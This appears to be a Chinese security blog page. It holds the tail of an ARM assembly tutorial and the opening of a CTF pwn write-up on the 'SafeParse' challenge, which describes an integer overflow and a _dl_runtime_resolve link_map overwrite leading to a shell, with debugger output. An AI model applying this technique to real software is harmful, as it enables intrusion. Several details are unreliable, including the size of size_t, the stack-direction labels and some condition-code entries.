<tr>
<th style="text-align:center">指令</th>
<th style="text-align:left">描述</th>
<th style="text-align:center">指令</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">MOV</td>
<td style="text-align:left">Move data</td>
<td style="text-align:center">EOR</td>
<td style="text-align:left">Bitwise XOR</td>
</tr>
<tr>
<td style="text-align:center">MVN</td>
<td style="text-align:left">Move and negate</td>
<td style="text-align:center">LDR</td>
<td style="text-align:left">Load</td>
</tr>
<tr>
<td style="text-align:center">ADD</td>
<td style="text-align:left">Addition</td>
<td style="text-align:center">STR</td>
<td style="text-align:left">Store</td>
</tr>
<tr>
<td style="text-align:center">SUB</td>
<td style="text-align:left">Subtraction</td>
<td style="text-align:center">LDM</td>
<td style="text-align:left">Load Multiple</td>
</tr>
<tr>
<td style="text-align:center">MUL</td>
<td style="text-align:left">Multiplication</td>
<td style="text-align:center">STM</td>
<td style="text-align:left">Store Multiple</td>
</tr>
<tr>
<td style="text-align:center">LSL</td>
<td style="text-align:left">Logical Shift Left</td>
<td style="text-align:center">PUSH</td>
<td style="text-align:left">Push on Stack</td>
</tr>
<tr>
<td style="text-align:center">LSR</td>
<td style="text-align:left">Logical Shift Right</td>
<td style="text-align:center">POP</td>
<td style="text-align:left">Pop off Stack</td>
</tr>
<tr>
<td style="text-align:center">ASR</td>
<td style="text-align:left">Arithmetic Shift Right</td>
<td style="text-align:center">B</td>
<td style="text-align:left">Branch</td>
</tr>
<tr>
<td style="text-align:center">ROR</td>
<td style="text-align:left">Rotate Right</td>
<td style="text-align:center">BL</td>
<td style="text-align:left">Branch with Link</td>
</tr>
<tr>
<td style="text-align:center">CMP</td>
<td style="text-align:left">Compare</td>
<td style="text-align:center">BX</td>
<td style="text-align:left">Branch and eXchange</td>
</tr>
<tr>
<td style="text-align:center">AND</td>
<td style="text-align:left">Bitwise AND</td>
<td style="text-align:center">BLX</td>
<td style="text-align:left">Branch with Link and eXchange</td>
</tr>
<tr>
<td style="text-align:center">ORR</td>
<td style="text-align:left">Bitwise OR</td>
<td style="text-align:center">SWI/SVC</td>
<td style="text-align:left">System Call</td>
</tr>
</tbody>
</table>
</div>
<h2 id="加载和存储"><a href="#加载和存储" class="headerlink" title="加载和存储"></a>加载和存储</h2><p>ARM 使用 load-store 模型进行内存访问，这意味着只有 load/store（LDR 和 STR）指令才能访问内存，虽然在x86上允许大多数指令直接对内存中的数据进行操作，但在ARM上，<strong>数据必须在操作之前从内存移动到寄存器中</strong></p>
<p>这意味着在 ARM 上的特定内存地址递增 32 位值需要三种类型的指令（加载、递增和存储），首先将特定地址的值加载到寄存器中，在寄存器中递增，然后将其从寄存器存储回存储器</p>
<p>通常，<code>LDR</code> 用于将某些内容从内存加载到寄存器中，而 <code>STR</code> 用于将某些内容从寄存器存储到内存地址</p>
<p><strong>常规操作</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDR R2, [R0] 	@ [R0]:原始地址是在 R0 中找到的值</span><br><span class="line">STR R2, [R1] 	@ [R1]:目标地址是在 R1 中找到的值</span><br></pre></td></tr></table></figure>
<ul>
<li>LDR 操作：将 R0 中找到的地址处的值加载到目标寄存器 R2</li>
<li>STR 操作：将 R2 中找到的值存储到 R1 中找到的内存地址</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">STR    Ra, [Rb, imm]</span><br><span class="line">LDR    Ra, [Rc, imm]</span><br></pre></td></tr></table></figure>
<ul>
<li>偏移形式为：使用立即（整数）作为偏移量</li>
<li><strong>偏移地址模式</strong>：先从基本寄存器 Ra 中添加或减去此值，然后再使用已知的偏移量访问数据</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">STR    Ra, [Rb, Rc]</span><br><span class="line">LDR    Ra, [Rb, Rc]</span><br></pre></td></tr></table></figure>
<ul>
<li>偏移形式为：使用寄存器作为偏移（偏移地址模式）<ul>
<li>Rb 是基寄存器</li>
<li>Rc 是偏移</li>
</ul>
</li>
<li>使用场景：当您的代码想要访问在运行时计算索引的数组</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDR    Ra, [Rb, Rc, &lt;shifter&gt;]</span><br><span class="line">STR    Ra, [Rb, Rc, &lt;shifter&gt;]</span><br></pre></td></tr></table></figure>
<ul>
<li>偏移形式为：具有缩放寄存器作为偏移（偏移地址模式）<ul>
<li>Rb 是基寄存器</li>
<li>Rc 是左/右移位（&lt; shifter &gt;）的即时偏移（或包含即时值的寄存器），以缩放即时偏移（这意味着桶形移位器用于缩放偏移）</li>
</ul>
</li>
<li>使用场景：循环以循环访问数组</li>
</ul>
<p><strong>特殊操作</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LDR r3, [r1], #offset</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>索引后地址模式</strong>：这意味着基寄存器（R1）用作最终地址，然后使用 R1 + 4 计算的失调进行更新</li>
<li>换句话说，它采用在 R1（不是 R1+4）中找到的值并将其加载到 R3 中，然后将 R1 更新为 R1 + offset</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ADR r0, words+12             /* address of words[3] -&gt; r0 */</span><br></pre></td></tr></table></figure>
<ul>
<li>我们使用 ADR 指令（懒惰方法）来获取 <code>word[3]</code> 的地址放入 R0</li>
<li>PS：其实这两个都是伪指令<ul>
<li>ADR 是小范围的地址读取伪指令</li>
<li>LDR 是大范围的读取地址伪指令</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDR r1, array_buff_bridge    /* address of array_buff[0] -&gt; r1 */</span><br><span class="line">LDR r2, array_buff_bridge+4  /* address of array_buff[2] -&gt; r2 */</span><br></pre></td></tr></table></figure>
<ul>
<li>执行上述两条指令后，R1 和 R2 包含 <code>array_buff[0]</code> 和 <code>array_buff[2]</code> 的地址</li>
<li>PS：对于数组，可以采用这种这种写法</li>
</ul>
<p><strong>同时处理多个值</strong></p>
<p>有时，一次加载（或存储）多个值会更有效，为此，我们使用 LDM（加载多个）和 STM（存储多个）指令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LDM r0, &#123;r4,r5&#125;              /* words[3] -&gt; r4 = 0x03; words[4] -&gt; r5 = 0x04 */</span><br></pre></td></tr></table></figure>
<ul>
<li>R0 中装有 <code>word[3]</code> </li>
<li>我们使用一个命令加载了多个（2个数据块），该命令将：<ul>
<li><code>R4 = 0x00000003</code> </li>
<li><code>R5 = 0x00000004</code></li>
</ul>
</li>
<li>PS：注意在合适的位置打上花括号</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stm r1, &#123;r4,r5&#125;              /* r4 -&gt; array_buff[0] = 0x03; r5 -&gt; array_buff[1] = 0x04 */</span><br></pre></td></tr></table></figure>
<ul>
<li>R1 中装有 <code>array_buff[0]</code> </li>
<li>我们使用一个命令存储了多个（2个数据块），该命令将：<ul>
<li><code>array_buff[0] = 0x00000003</code></li>
<li><code>array_buff[1] = 0x00000004</code></li>
</ul>
</li>
</ul>
<h2 id="条件执行"><a href="#条件执行" class="headerlink" title="条件执行"></a>条件执行</h2><p>CPSR 中的 N、Z、C 和 V 位与 x86 上 EFLAG 寄存器中的 SF、ZF、CF 和 OF 位相同，它们将用于支持程序集级别的条件和循环中的条件执行</p>
<p>下表列出了可用的条件代码、其含义以及测试的标志的状态：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">Condition Code</th>
<th style="text-align:center">Meaning (for cmp or subs)</th>
<th style="text-align:center">Status of Flags</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">EQ</td>
<td style="text-align:center">相等</td>
<td style="text-align:center">Z==1</td>
</tr>
<tr>
<td style="text-align:center">NE</td>
<td style="text-align:center">不相等</td>
<td style="text-align:center">Z==0</td>
</tr>
<tr>
<td style="text-align:center">GT</td>
<td style="text-align:center">大于（有符号）</td>
<td style="text-align:center">(Z==0) &amp;&amp; (N==V)</td>
</tr>
<tr>
<td style="text-align:center">LT</td>
<td style="text-align:center">小于（有符号）</td>
<td style="text-align:center">N!=V</td>
</tr>
<tr>
<td style="text-align:center">GE</td>
<td style="text-align:center">大于等于（有符号）</td>
<td style="text-align:center">N==V</td>
</tr>
<tr>
<td style="text-align:center">LE</td>
<td style="text-align:center">小于等于（有符号）</td>
<td style="text-align:center">(Z==1) \</td>
<td>\</td>
<td>(N!=V)</td>
</tr>
<tr>
<td style="text-align:center">CS or HS</td>
<td style="text-align:center">大于等于（无符号）</td>
<td style="text-align:center">C==1</td>
</tr>
<tr>
<td style="text-align:center">CC or LO</td>
<td style="text-align:center">小于（无符号）</td>
<td style="text-align:center">C==0</td>
</tr>
<tr>
<td style="text-align:center">HI</td>
<td style="text-align:center">大于（无符号）</td>
<td style="text-align:center">(C==1) &amp;&amp; (Z==0)</td>
</tr>
<tr>
<td style="text-align:center">LS</td>
<td style="text-align:center">小于等于（无符号）</td>
<td style="text-align:center">(C==0) \</td>
<td>\</td>
<td>(Z==0)</td>
</tr>
<tr>
<td style="text-align:center">MI</td>
<td style="text-align:center">负数</td>
<td style="text-align:center">N==1</td>
</tr>
<tr>
<td style="text-align:center">PL</td>
<td style="text-align:center">正数或零</td>
<td style="text-align:center">N==0</td>
</tr>
<tr>
<td style="text-align:center">AL</td>
<td style="text-align:center">True</td>
<td style="text-align:center">–</td>
</tr>
<tr>
<td style="text-align:center">NV</td>
<td style="text-align:center">False</td>
<td style="text-align:center">–</td>
</tr>
<tr>
<td style="text-align:center">VS</td>
<td style="text-align:center">有符号溢出</td>
<td style="text-align:center">V==1</td>
</tr>
<tr>
<td style="text-align:center">VC</td>
<td style="text-align:center">无符号溢出</td>
<td style="text-align:center">V==0</td>
</tr>
</tbody>
</table>
</div>
<p><strong>Thumb 条件执行</strong></p>
<p>ARM 存在多种允许条件执行的 Thumb 版本，某些 ARM 处理器版本支持“IT”指令，该指令允许在 Thumb 状态下有条件地执行最多 4 条指令 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IT&#123;x&#123;y&#123;z&#125;&#125;&#125; cond</span><br></pre></td></tr></table></figure>
<ul>
<li><em>cond</em> 指定 IT 块中第<strong>一</strong>条指令的条件</li>
<li><em>x</em> 指定 IT 块中第<strong>二</strong>条指令的条件开关</li>
<li><em>y</em> 指定 IT 块中第<strong>三</strong>条指令的条件开关</li>
<li><em>z</em> 指定 IT 块中第<strong>四</strong>条指令的条件开关</li>
</ul>
<p>IT 指令的结构是 “IF-Then-(Else)”，语法是两个字母 T 和 E 的构造：</p>
<ul>
<li>IT 指的是 If-Then（下一个指令是有条件的）</li>
<li>ITT 指的是 If-Then-Then（接下来的2条指令是有条件的）</li>
<li>ITE 指的是 If-Then-Else（接下来的2条指令是有条件的）</li>
<li>ITTE 指的是 If-Then-Then-Else（接下来的3个指令是有条件的）</li>
<li>ITTEE 指的是 If-Then-Then-Else-Else（接下来的4个指令是有条件的）</li>
</ul>
<p>IT 块内的每条指令都必须指定一个相同或逻辑相反的条件后缀：</p>
<ul>
<li>如果使用 ITE，则第一条和第二条指令 (If-Then) 必须具有相同的条件后缀，第三条指令 (Else) 必须具有前两条指令的逻辑反比</li>
<li>以下是 ARM 参考手册中的一些示例，其中说明了此逻辑： </li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ITTE   NE           ; Next 3 instructions are conditional</span><br><span class="line">ANDNE  R0, R0, R1   ; ANDNE does not update condition flags</span><br><span class="line">ADDSNE R2, R2, #1   ; ADDSNE updates condition flags</span><br><span class="line">MOVEQ  R2, R3       ; Conditional move</span><br><span class="line"></span><br><span class="line">ITE    GT           ; Next 2 instructions are conditional</span><br><span class="line">ADDGT  R1, R0, #55  ; Conditional addition in case the GT is true</span><br><span class="line">ADDLE  R1, R0, #48  ; Conditional addition in case the GT is not true</span><br><span class="line"></span><br><span class="line">ITTEE  EQ           ; Next 4 instructions are conditional</span><br><span class="line">MOVEQ  R0, R1       ; Conditional MOV</span><br><span class="line">ADDEQ  R2, R2, #10  ; Conditional ADD</span><br><span class="line">ANDNE  R3, R3, #1   ; Conditional AND</span><br><span class="line">BNE.W  dloop        ; Branch instruction can only be used in the last instruction of an IT block</span><br></pre></td></tr></table></figure>
<p><strong>跳转&amp;分支</strong></p>
<p>分支（又名Jumps）允许我们跳转到另一个代码段，当我们需要跳过（或重复）代码块或跳转到特定函数时，这很有用</p>
<ul>
<li>这种用例的最佳示例是 IF 和 Loop</li>
</ul>
<p>有三种类型的分支指令：</p>
<ul>
<li>分支（B）<ul>
<li>简单跳转到函数</li>
</ul>
</li>
<li>分支链接（BL）<ul>
<li>在 LR 中保存 （PC+4） 并跳转到功能</li>
</ul>
</li>
<li>分支交换（BX）和分支链路交换（BLX）<ul>
<li>与 B/BL 交换指令集相同（ARM &lt;-&gt; Thumb）</li>
<li>需要寄存器作为第一个操作数：BX/BLX [reg]</li>
</ul>
</li>
<li>BX/BLX 用于将指令集从 ARM 交换到 Thumb，示例如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">     .code 32         @ ARM mode</span><br><span class="line">     add r2, pc, #1   @ put PC+1 into R2</span><br><span class="line">     bx r2            @ branch + exchange to R2</span><br><span class="line"></span><br><span class="line">    .code 16          @ Thumb mode</span><br><span class="line">     mov r0, #1</span><br></pre></td></tr></table></figure>
<ul>
<li>这里的诀窍是获取实际 PC 的当前值，将其增加“1”，将结果存储到寄存器，然后执行 <code>BX/BLX [reg]</code></li>
<li><code>add r2, pc, #1</code>：简单地获取有效的PC地址（即当前PC寄存器的值+8 -&gt; 0x805C）并为其添加“1”（0x805C + 1 = 0x805D） </li>
</ul>
<h2 id="栈和函数"><a href="#栈和函数" class="headerlink" title="栈和函数"></a>栈和函数</h2><p><strong>栈</strong> </p>
<p>一般来说，堆栈是程序/进程中的内存区域，这部分内存是在创建进程时分配的</p>
<ul>
<li>我们使用 Stack 来存储临时数据，例如某些函数的局部变量，帮助我们在函数之间转换的环境变量等</li>
<li>我们使用 PUSH 和 POP 指令与堆栈进行交互，如 PUSH 和 POP（这是其他一些内存相关指令的别名，而不是实际指令，但出于简单起见，我们使用 PUSH 和 POP）</li>
</ul>
<p>首先，当我们说 Stack 增长时，我们的意思是一个项目（32位数据）被放在 Stack 上，堆栈可以 <strong>向上</strong> 增长（当堆栈以降序方式实现时）或 <strong>向下</strong> 增长（当堆栈以上升方式实现时），下一条（32位）信息的实际位置由堆栈指针定义，或者确切地说，由存储在SP寄存器中的内存地址定义</p>
<p>栈地址的增长方向：</p>
<ul>
<li>向高地址增长的栈称为 <strong>递增栈</strong>（Descendent Stack）</li>
<li>向低地址增长的栈称为 <strong>递减栈</strong>（Acendant Stack） </li>
</ul>
<p>作为不同 Stack 实现的摘要，我们可以使用下表，其中描述了在不同情况下使用哪些存储多个/加载多个指令：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">堆栈类型</th>
<th style="text-align:left">Store</th>
<th style="text-align:left">Load</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">完全降序</td>
<td style="text-align:left">STMFD （STMDB，Decrement Before）</td>
<td style="text-align:left">LDMFD（LDM，Increment after）</td>
</tr>
<tr>
<td style="text-align:center">完全升序</td>
<td style="text-align:left">STMFA （STMIB，Increment Before）</td>
<td style="text-align:left">LDMFA （LDMDA，Decrement After）</td>
</tr>
<tr>
<td style="text-align:center">空降序</td>
<td style="text-align:left">STMED （STMDA，Decrement After）</td>
<td style="text-align:left">LDMED （LDMIB，Increment Before）</td>
</tr>
<tr>
<td style="text-align:center">空升序</td>
<td style="text-align:left">STMEA（STM，Increment after）</td>
<td style="text-align:left">LDMEA （LDMDB，Decrement Before）</td>
</tr>
</tbody>
</table>
</div>
<p><strong>函数</strong></p>
<p>要理解 ARM 中的函数，我们首先需要熟悉函数的结构部分，它们是：</p>
<ol>
<li>Prologue（序幕）</li>
<li>Body（主体）</li>
<li>Epilogue（结语）</li>
</ol>
<p><strong>Prologue（序幕）</strong>的目的是保存程序的先前状态（通过将 LR 和 R11 的值存储到堆栈上），并为函数的局部变量设置堆栈（虽然序言的实现可能因使用的编译器而异，但通常这是通过使用 PUSH / ADD / SUB 指令来完成的）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push &#123;r11, lr&#125; 		/* 序幕的开始,将帧指针和LR保存到堆栈 */</span><br><span class="line">add r11, sp, #0 	/* 设置栈底帧 */</span><br><span class="line">sub sp, sp, #16 	/* 序幕结束,在堆栈上分配一些缓冲区(这也为堆栈帧分配空间) */</span><br></pre></td></tr></table></figure>
<p><strong>Body（主体）</strong> 部分通常负责某种独特而特定的任务，这部分函数可能包含各种指令，分支（跳转）到其他函数等，函数的 body 部分的示例可以像以下几条指令一样简单： </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov r0, #1 			/* 设置局部变量 (a=1)。 这也用作设置函数 max */ 的第一个参数</span><br><span class="line">mov r1, #2 			/* 设置局部变量 (b=2)。 这也用作设置函数 max */ 的第二个参数</span><br><span class="line">bl max 				/* 调用/分支到函数 max */</span><br></pre></td></tr></table></figure>
<ul>
<li>上面的示例代码显示了一个函数的片段，该函数设置局部变量，然后分支到另一个函数</li>
<li>这段代码还向我们展示了函数的参数（在本例中为函数 max）是通过寄存器传递的</li>
<li>在某些情况下，当有超过4个参数要传递时，我们会另外使用 Stack 来存储剩余的参数</li>
<li>还值得一提的是，函数的结果通过寄存器 R0 返回，因此，无论函数（max）的结果是什么，我们应该能够在从函数返回后立即从寄存器 R0 中获取它</li>
<li>需要指出的另一件事是，在某些情况下，结果的长度可能是64位（超过32位寄存器的大小） </li>
</ul>
<p>函数的最后一部分，即 <strong>Epilogue（结语）</strong>，用于将程序的状态恢复到其初始状态（在函数调用之前），以便它可以从它离开的位置继续，为此，我们需要重新调整堆栈指针（这是通过使用帧指针寄存器 R11 作为参考并执行添加或子操作来完成的）</p>
<p>重新调整堆栈指针后，通过将以前（在序幕中）保存的寄存器值从堆栈中弹出到相应的寄存器中来恢复它们，根据函数类型，POP 指令可能是 Epilogue 的最终指令（但是，可能是在恢复寄存器值后，我们使用 BX 指令离开函数），Epilogue 的示例如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub sp, r11, #0 		/* 结尾的开始,重新调整堆栈指针 */</span><br><span class="line">pop &#123;r11, pc&#125; 			/* 结尾,从堆栈中恢复帧指针,通过直接加载到PC中跳转到以前保存的LR,函数的堆栈帧最终在这一步被销毁 */</span><br></pre></td></tr></table></figure>
<p>所以现在我们知道：</p>
<ol>
<li>Prologue（序幕）为功能设置环境</li>
<li>Body（主体）实现函数的逻辑并将结果存储到 R0</li>
<li>Epilogue（结语）还原状态，以便程序可以从调用函数之前离开的位置恢复</li>
</ol>
<p>参考：<a target="_blank" rel="noopener" href="https://azeria-labs.com/writing-arm-assembly-part-1/">编写 ARM 程序集|阿泽里亚实验室</a> </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/26/dl_runtime_resolve%20attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/26/dl_runtime_resolve%20attack/" class="post-title-link" itemprop="url">dl_runtime_resolve attack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-26 17:36:41 / Modified: 17:38:57" itemprop="dateCreated datePublished" datetime="2022-08-26T17:36:41+08:00">2022-08-26</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>SafeParse</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SafeParse: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=bb35942986f3f07abe813fd1a86be5920f5b6c7e, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/桌面/pwn_SafeParse/SafeParse&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，全开，开启延迟绑定</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data_size = input_num();</span><br><span class="line">chunk = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="number">4</span> * data_size);         <span class="comment">// 整数溢出</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这里有一个整数溢出（这个漏洞点和初赛 newest_note 的非预期解很像）</li>
</ul>
<p>直接让 data_size 为 0x40040000，就可以让这个存堆指针的堆申请到 libc 上面</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：这里的 size_t 代表的是 unsorted int（4字节）</li>
</ul>
<p>溢出过后，“data_size” 会特别大，但是 mmap 申请的 chunk 又比较小，以下的这个检查就形同虚设了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( index &gt;= data_size )</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>然后就可以实现 libc 任意写，由于没法 leak，我们只能打 <code>_dl_runtime_resolve</code></p>
<p><code>DT_STRTAB</code> 在 elf 中，由于没有泄露任何地址，目前是通过偏移进行任意地址写，这里找到 <code>DT_DEBUG</code> 这个表是指向 libc 地址（我们可以控制），可以通过改写最低位：</p>
<ul>
<li>把 <code>link_map-&gt;l_info[DT_STRTAB]</code> 低位覆盖为 <code>link_map-&gt;l_info[DT_DEBUG]</code> 这样程序就会误以为 <code>DT_DEBUG</code> 是 <code>DT_STRTAB</code>（这下放入 <code>_dl_lookup_symbol_x</code> 的第二个参数就会变成 <code>DT_DEBUG</code>）</li>
<li>于是我们提前在 <code>DT_DEBUG+offset</code>（原来是 <code>DT_STRTAB+offset</code>）的位置写上 <code>system</code></li>
<li>提前在 <code>chunk</code> 中写入 <code>/bin/sh</code></li>
<li>最后在执行 <code>free(chunk)</code> 时就会 get shell</li>
</ul>
<p>低位覆盖 <code>link_map-&gt;l_info[DT_STRTAB]</code>，欺骗 <code>_dl_fixup</code> 函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f3b00ba2000</span>+<span class="number">0x324180</span>+<span class="number">0x10</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsi r10 <span class="number">0x7f3b00ec6190</span> —▸ <span class="number">0x564f9b542000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│         <span class="number">0x7f3b00ec6198</span> ◂— <span class="number">0x6165720000ec6730</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│         <span class="number">0x7f3b00ec61a0</span> ◂— <span class="number">0x564f9b540064</span> <span class="comment">/* &#x27;d&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│         <span class="number">0x7f3b00ec61a8</span> —▸ <span class="number">0x7f3b00ec6740</span> —▸ <span class="number">0x7ffe633fe000</span> ◂— jg     <span class="number">0x7ffe633fe047</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│         <span class="number">0x7f3b00ec61b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│         <span class="number">0x7f3b00ec61b8</span> —▸ <span class="number">0x7f3b00ec6190</span> —▸ <span class="number">0x564f9b542000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│         <span class="number">0x7f3b00ec61c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0x7f3b00ec61c8</span> —▸ <span class="number">0x7f3b00ec6718</span> —▸ <span class="number">0x7f3b00ec6730</span> ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; </span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│       <span class="number">0x7f3b00ec61d0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│       <span class="number">0x7f3b00ec61d8</span> —▸ <span class="number">0x564f9b545de0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│       <span class="number">0x7f3b00ec61e0</span> —▸ <span class="number">0x564f9b545ec0</span> ◂— <span class="number">0x2</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│       <span class="number">0x7f3b00ec61e8</span> —▸ <span class="number">0x564f9b545eb0</span> ◂— <span class="number">0x3</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│ rdi<span class="number">-1</span> <span class="number">0x7f3b00ec61f0</span> ◂— <span class="number">0x6d657473797300</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│       <span class="number">0x7f3b00ec61f8</span> —▸ <span class="number">0x564f9b545ea0</span> ◂— <span class="number">0x15</span> <span class="comment">/* 低位覆盖&quot;\xa0&quot; */</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│       <span class="number">0x7f3b00ec6200</span> —▸ <span class="number">0x564f9b545e70</span> ◂— <span class="number">0x6</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│       <span class="number">0x7f3b00ec6208</span> —▸ <span class="number">0x564f9b545ef0</span> ◂— <span class="number">0x7</span></span><br></pre></td></tr></table></figure>
